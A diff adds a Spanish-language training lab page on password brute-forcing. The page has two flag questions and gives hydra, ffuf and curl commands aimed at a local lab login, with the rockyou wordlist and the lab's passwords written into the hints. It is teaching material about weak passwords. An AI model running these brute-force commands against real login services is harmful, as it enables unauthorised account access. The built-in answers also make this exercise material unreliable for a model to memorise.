@@ -1,0 +1,31 @@
+---
+index: 4
+title: "Lab: fuerza bruta con hydra"
+questions:
+  - id: herramientas-ofensivas-t04-q01
+    prompt: "Fuerza bruta la contraseña del usuario 'admin' y envía la flag."
+    hint: "curl el lab: prueba summer2014 directamente, o usa hydra contra el form GET"
+    kind: flag
+  - id: herramientas-ofensivas-t04-q02
+    prompt: "La cuenta de servicio 'svc_backup' tiene la contraseña más débil de todas (changeme). Envía su flag."
+    hint: "curl 'http://LAB/login?username=svc_backup&password=changeme'"
+    kind: flag
+---
+
+## Práctica: hydra contra un login real
+
+```bash
+# Verificar directamente (si conoces la password):
+curl "http://127.0.0.1:18090/login?username=admin&password=summer2014"
+
+# Con hydra (GET form):
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 18090 \
+  http-get-form "/login:username=^USER^&password=^PASS^:incorrect"
+
+# Con ffuf:
+ffuf -w rockyou.txt -u "http://127.0.0.1:18090/login?username=admin&password=FUZZ" -fc 401
+```
+
+Las passwords de este lab están en el top-100 de rockyou.txt. Esa es la lección:
+si tu contraseña está en un diccionario, un ataque de fuerza bruta la encuentra
+en segundos.
